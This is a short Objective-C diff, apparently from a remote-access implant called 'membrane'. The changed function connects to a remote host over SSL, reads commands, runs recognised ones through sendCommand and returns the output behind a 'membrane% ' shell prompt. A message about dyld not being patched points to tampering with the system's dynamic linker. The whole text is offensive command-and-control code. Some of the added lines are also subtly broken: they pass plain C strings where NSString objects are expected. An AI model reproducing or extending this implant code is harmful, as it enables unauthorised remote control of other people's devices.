@@ -57,26 +57,22 @@ void sendString(NSString *string) {
 void interactWithServer(NSString *remoteHost, int remotePort) {
     membrane *membrane_base = [[membrane alloc] init];
     membrane_base->client_ssl = client_ssl;
-    
+    sendString("membrane% ");
+
     char buffer[2048] = "";
-    
     while (SSL_read(client_ssl, buffer, sizeof(buffer))) {
-        NSString *terminator = [NSString stringWithFormat:@"%s", buffer];
-        memset(buffer, '\0', 2048);
-    
-        SSL_read(client_ssl, buffer, sizeof(buffer));
         NSMutableArray *args = [NSMutableArray arrayWithArray:[[NSString stringWithUTF8String:buffer] componentsSeparatedByString:@" "]];
-        
+
         if ([commands containsObject:args[0]]) {
             NSString *result = [membrane_base sendCommand:args];
-            if (result) {
+            if (result)
                 sendString(result);
-                SSL_write(client_ssl, [terminator UTF8String], (int)terminator.length);
-            } else sendString(@"dyld is not patched");
-        } else {
+            else
+                sendString(@"dyld is not patched");
+        } else
             sendString(@"unrecognized command");
-            SSL_write(client_ssl, [terminator UTF8String], (int)terminator.length);
-        }
+
+        sendString("membrane% ");
         memset(buffer, '\0', 2048);
     }
 }
